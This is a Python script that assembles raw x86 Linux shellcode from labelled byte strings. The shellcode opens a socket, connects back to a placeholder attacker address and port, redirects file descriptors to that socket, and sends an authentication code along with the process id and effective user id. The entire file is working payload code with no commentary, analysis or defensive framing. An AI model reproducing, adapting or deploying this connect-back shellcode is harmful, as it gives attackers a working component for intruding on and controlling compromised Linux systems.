#!/usr/bin/python

start = \
   "\xe9\x90\x00\x00\x00"

picBegin = \
   "\x5f"

socket = \
   "\x6a\x00\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb3\x01\x31\xc0\xb0\x66"\
   "\xcd\x80\x89\xc6"

connect = \
   "\x6a\x10\x8d\x1f\x53\x50\x89\xe1\x31\xdb\xb3\x03\x31\xc0\xb0\x66"\
   "\xcd\x80\x83\xf8\x00\x7c\x48"

dup2 = \
   "\x31\xc9\xb1\x03\x89\xf3"

dup2Loop = \
   "\x49\x31\xc0\xb0\x3f\xcd\x80\x83\xf8\x00\x7c\x36\x83\xf9\x00\x75"\
   "\xef"

close = \
   "\x31\xc0\xb0\x06\xcd\x80"

sendAuth = \
   "\x8d\x8f\x10\x00\x00\x00\xe8\x28\x00\x00\x00"

getpid = \
   "\x31\xc0\xb0\x14\xcd\x80\x50\x89\xe1\xe8\x1a\x00\x00\x00\x58"

geteuid = \
   "\x31\xc0\xb0\x31\xcd\x80\x50\x89\xe1\xe8\x0b\x00\x00\x00\x58\xeb"\
   "\x35"

exit = \
   "\x31\xdb\x31\xc0\xb0\x01\xcd\x80"

write = \
   "\x31\xd2\x89\xd3\x89\xd0\xb2\x04\xb3\x01\x89\xd0\xcd\x80\x83\xf8"\
   "\x04\x75\xe5\xc3"

callBackwards = \
   "\xe8\x6b\xff\xff\xff"

# serv_addr
data = \
   "\x02\x00"

cport = \
   "\xcd\xab"

cip = \
   "\x78\x56\x34\x12"

filler = \
   "\xff\xff\xff\xff\xff\xff\xff\xff"

authCode = \
   "\x44\x43\x42\x41"

def build():
   tmp = \
      start + \
      picBegin + \
      socket + \
      connect + \
      dup2 + \
      dup2Loop + \
      close + \
      sendAuth + \
      getpid + \
      geteuid + \
      exit + \
      write + \
      callBackwards + \
      data + \
      cport + \
      cip + \
      filler + \
      authCode
   return tmp
